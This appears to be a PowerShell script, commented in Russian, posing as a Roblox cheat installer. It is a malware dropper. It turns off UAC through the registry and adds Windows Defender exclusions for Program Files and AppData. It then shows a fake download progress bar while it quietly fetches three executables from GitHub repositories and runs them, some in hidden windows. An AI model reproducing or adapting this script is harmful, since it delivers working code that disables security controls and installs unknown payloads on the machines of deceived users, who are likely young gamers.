# --- БЛОК 1: ОТКЛЮЧЕНИЕ UAC (КОНТРОЛЯ УЧЕТНЫХ ЗАПИСЕЙ) ---

Write-Host "Отключение UAC..."
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0
Write-Host "UAC отключен. Требуется перезагрузка для полного применения." -ForegroundColor Yellow

# --- БЛОК 2: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (если нужно) ---

# Добавляем папки в исключения, чтобы антивирус не мешал работе программ
Write-Host "Добавление папок в исключения..."
try {
    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
    Add-MpPreference -ExclusionPath $ProgramFiles

    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
    if (Test-Path $ProgramFilesX86) {
        Add-MpPreference -ExclusionPath $ProgramFilesX86
    }

    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
    Add-MpPreference -ExclusionPath $AppData

    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
    Add-MpPreference -ExclusionPath $LocalAppData
    
    Write-Host "Исключения добавлены." -ForegroundColor Green
}
catch {
    Write-Host "Не удалось добавить исключения." -ForegroundColor Red
}

Write-Host "`nВсе команды выполнены. Для применения изменений UAC рекомендуется перезагрузить компьютер." -ForegroundColor Cyan
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath = $ProgramFiles -replace " \(x86\)", ""
        Add-MpPreference -ExclusionPath $updpath

        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }

        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData

        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
        }
        }
catch {
}
Clear-Host
Write-Host "Запуск загрузчика читов для Roblox..." -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host "Подключение к серверу хаков..." -ForegroundColor Yellow
Start-Sleep -Seconds 3

Write-Host "Авторизация анонимного доступа..." -ForegroundColor Cyan
Start-Sleep -Seconds 2

Write-Host "Начало скачивания: Roblox_Ultimate_Cheats_v999.exe (размер: 420 MB)" -ForegroundColor Green

for ($i = 1; $i -le 100; $i++) {
    Write-Progress -Activity "Скачивание читов для Roblox" -Status "Прогресс: $i% | Скорость: $((Get-Random -Minimum 10 -Maximum 50)) MB/s" -PercentComplete $i
    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 200)  # Рандомная задержка для реализма
}

Write-Progress -Activity "Скачивание читов для Roblox" -Completed

Write-Host ""
Write-Host "Скачивание завершено успешно!" -ForegroundColor Green
Start-Sleep -Seconds 2

Write-Host "Распаковка файлов..." -ForegroundColor Yellow
Start-Sleep -Seconds 4

Write-Host "Установка читов..." -ForegroundColor Cyan
Start-Sleep -Seconds 3

Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
    Start-Sleep 1

    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -OutFile "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe"; .\enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe   
    
    # Запускаем
    Start-Process -FilePath "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -WindowStyle Hidden
    
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe    
    # Запускаем 
    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
    
    # Удаляем файл через 5 секунды
   
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
    
Write-Host ""
Write-Host "ГОТОВО! ЧИТ в Roblox УСТАНОВЛЕН!" -ForegroundColor Magenta
Pause


